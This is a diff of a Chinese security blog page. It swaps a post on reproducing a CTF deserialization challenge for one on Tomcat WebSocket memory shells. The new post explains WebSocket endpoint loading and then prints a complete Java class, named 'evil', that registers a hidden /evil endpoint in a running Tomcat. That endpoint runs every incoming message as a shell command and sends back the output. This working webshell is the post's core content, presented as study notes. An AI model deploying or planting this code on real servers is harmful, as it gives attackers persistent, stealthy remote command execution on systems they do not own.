@@ -24,7 +24,7 @@
 
   
 
-  <title>Dest0g3 ljcrt | CyanM0un</title>
+  <title>MemShell-TomcatWebSocket | CyanM0un</title>
 
   
 
@@ -47,7 +47,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(/images/ljcrt.png)"></div>
+    <div class="post-image" style="background-image: url(/images/mtws.jpg)"></div>
   
 
   <!-- navbar -->
@@ -94,15 +94,17 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">Dest0g3 ljcrt</h1>
+          <h1 class="title-wrap">MemShell-TomcatWebSocket</h1>
           <h2 class="title-sub-wrap">
             <strong>CyanM0un</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-07-26T13:27:15.000Z" itemprop="datePublished">2022-07-26</time>
+            <time  class="article-date" datetime="2022-07-29T01:22:56.000Z" itemprop="datePublished">2022-07-29</time>
           </h2>
           <ul class="wrap-list dark">
   
     <li><a href="/categories/%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/">📒 复现学习</a></li>
+  
+    <li><a href="/categories/%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/">📒 内存马</a></li>
   
 </ul>
           <ul class="wrap-list dark">
@@ -129,43 +131,49 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>师傅出的题真的很好，学到了什么叫“灵活处理”，以及在学习别人文章的时候要多思考（其实原本想到了能不能用反射的方法修改下值，但是一看见 new 了一个对象就觉得不行了，怎么没想到“修改源码”的方法呢）</p>
-<p>回顾一下上篇文章的内容：</p>
-<p><img src="/Dest0g3-ljcrt.assets/KpeDjIwvfBz61lL.png" alt="image.png"></p>
-<p>为null是因为在该类的writeobject中：</p>
-<p><img src="/Dest0g3-ljcrt.assets/lweZGavDM2JPmyB.png" alt="image.png"></p>
-<p>new 了一个 ReferenceIndirector 的对象，序列化的是该对象 indirectFrom 方法返回的对象：</p>
-<p><img src="/Dest0g3-ljcrt.assets/T6FSiXPlodNy2xg.png" alt="image.png"></p>
-<p><img src="/Dest0g3-ljcrt.assets/kHfEzlIVOARML6q.png" alt="image.png"></p>
-<p>所以之前说只有 var2 可控，但我们是不是忘了什么？</p>
-<p>熟悉 PHP 反序列化的朋友知道序列化的数据其实重要的部分就是“属性值”，在 java 里应该就是师傅所说的修改字节码，我们可以不这么麻烦，完全可以<strong>仅修改 writeobject</strong> 方法就可以了。可以修改 C3P0 源码再重新生成 jar 包自己用（不太优雅，想想以前魔改 yso 也是这样的），然后就是师傅所说的利用 java agent 技术，算一次很好的再次实战，不了解的可以看看之前的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/WDWAGAAFGAGDADSA/article/details/122270281">https://blog.csdn.net/WDWAGAAFGAGDADSA/article/details/122270281</a></p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>可以自己复制下师傅的 payload 生成 jar，也可以就用师傅的 jar 包</p>
-<p>因为本来打算在 buu 上复现，所以稍微改一下 ip 之类的，然后点 project-structure -&gt; artifacts -&gt; add jar -&gt; from moudule</p>
-<p>可以把师傅原来里面的</p>
-<p><img src="/Dest0g3-ljcrt.assets/image-20220719090825872.png" alt="image-20220719090825872"></p>
-<p>提取出来添加到依赖中，再修改一下MANIFEST.MF文件即可</p>
-<p>我就采用preagent的方法了，将方法修改为</p>
-<p><img src="/Dest0g3-ljcrt.assets/image-20220719102255851.png" alt="image-20220719102255851"></p>
-<p><img src="/Dest0g3-ljcrt.assets/image-20220719102330520.png" alt="image-20220719102330520"></p>
-<p>运行时加上参数即可：</p>
-<p><img src="/Dest0g3-ljcrt.assets/image-20220719102353815.png" alt="image-20220719102353815"></p>
-<p>在两种加载代理的方法踩了许多坑：比如为什么静态时添加method方法体时一直报运行时错误；动态加载代理时一直是初始化失败；静态加载的应该是jar包却可以在源代码修改debug？本人不才，解决不了，只有修改源代码这一条路了</p>
-<p>把mchange-commons源代码下载后用IDEA打开，添加三个依赖，编译成jar包，注意java版本，不然可能会有奇奇怪怪的错误，然后把它添加到原项目中</p>
-<p><img src="/Dest0g3-ljcrt.assets/ltETxzrwRHJaCj7.png" alt="image.png"></p>
-<p><img src="/Dest0g3-ljcrt.assets/3FXKYqZQ41Tys6C.png" alt="image.png"></p>
-<p>然后记录一下一些命令</p>
-<p><img src="/Dest0g3-ljcrt.assets/AzndXEjqB2sHKhe.png" alt="image.png"></p>
-<p><img src="/Dest0g3-ljcrt.assets/sGMhupFIlytrOXL.png" alt="image.png"></p>
-<p>虽然最后还是没有复现成功，但学到了很多经验</p>
-<p>打算后来学习一下JNDIExploit这工具的写法，因为复现不成功总是因为搭建恶意RMIServer没有反应（做题已经遇见好几次了）</p>
-<p>还有个点是不论是agent方法还是修改源代码，记得绕过一下ldap字符串的检测</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://firebasky.github.io/2022/06/04/ljctr-wp/">https://firebasky.github.io/2022/06/04/ljctr-wp/</a></p>
+        <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="WebSocket实现"><a href="#WebSocket实现" class="headerlink" title="WebSocket实现"></a>WebSocket实现</h3><p>仅记录一下注解的实现</p>
+<ul>
+<li><code>value</code>：必要，String类型，此Endpoint部署的URI路径。</li>
+<li><code>configurator</code>：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。</li>
+<li><code>decoders</code>：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。</li>
+<li><code>encoders</code>：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。</li>
+<li><code>subprotocols</code>：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。</li>
+</ul>
+<p>比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ServerEndpoint(value = &quot;/ws/&#123;userId&#125;&quot;, encoders = &#123;MessageEncoder.class&#125;, decoders = &#123;MessageDecoder.class&#125;, configurator = MyServerConfigurator.class)</span><br></pre></td></tr></table></figure>
+
+<p>@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：</p>
+<ul>
+<li><code>@OnOpen</code> 建立连接时触发。</li>
+<li><code>@OnClose</code> 关闭连接时触发。</li>
+<li><code>@OnError</code> 发生异常时触发。</li>
+<li><code>@OnMessage</code> 接收到消息时触发。</li>
+</ul>
+<h3 id="WebSocket加载"><a href="#WebSocket加载" class="headerlink" title="WebSocket加载"></a>WebSocket加载</h3><blockquote>
+<p>Tomcat的WebSocket加载是通过SCI机制完成的</p>
+</blockquote>
+<p><img src="/MemShell-TomcatWebSocket.assets/image-20220729094144741.png" alt="image-20220729094144741"></p>
+<p>然后调用addEndpoint方法注册到WebSocketContainer上</p>
+<p>所以思路：</p>
+<ol>
+<li>获取当前的StandardContext</li>
+<li>通过StandardContext获取ServerContainer</li>
+<li>定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI path</li>
+<li>调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去</li>
+</ol>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>假如有某处可以控制代码加载了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="type">ServerEndpointConfig</span> <span class="variable">build</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(evil.class, <span class="string">&quot;/evil&quot;</span>).build();</span><br><span class="line">        <span class="type">WsServerContainer</span> <span class="variable">attribute</span> <span class="operator">=</span> (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            attribute.addEndpoint(build);</span><br><span class="line">            <span class="comment">// System.out.println(&quot;ok!&quot;);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (DeploymentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">iswin</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>);</span><br><span class="line">            Process exec;</span><br><span class="line">            <span class="keyword">if</span> (iswin) &#123;</span><br><span class="line">                exec = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, message&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                exec = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, message&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">ips</span> <span class="operator">=</span> exec.getInputStream();</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="keyword">while</span>((i = ips.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                sb.append((<span class="type">char</span>)i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ips.close();</span><br><span class="line">            exec.waitFor();</span><br><span class="line">            <span class="built_in">this</span>.session.getBasicRemote().sendText(sb.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        <span class="built_in">this</span>.session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/MemShell-TomcatWebSocket.assets/image-20220729101333006.png" alt="image-20220729101333006"></p>
+<h2 id="详细学习"><a href="#详细学习" class="headerlink" title="详细学习"></a>详细学习</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11566">https://xz.aliyun.com/t/11566</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11549">https://xz.aliyun.com/t/11549</a></p>
 
       </section>
 
       
       
         <nav class="article-nav">
+          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -176,23 +184,6 @@
       
         <a href="/2022/07/28/tabby-Spring-Data-MongoDB-SPEL/" itemprop="url">
           <h2 class="card-text--title text-ellipsis">tabby Spring Data MongoDB SPEL</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
-          
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="/images/ezchain.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/07/25/HFCTF-ezchain/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">HFCTF ezchain</h2>
         </a>
       
       <div class="card-text--row">Older</div>
@@ -261,7 +252,7 @@
     <span>TOC</span>
   </div>
   <div class="widget-body">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSocket%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">WebSocket实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSocket%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">WebSocket加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0"><span class="toc-number">3.</span> <span class="toc-text">详细学习</span></a></li></ol>
   </div>
 </section>
 
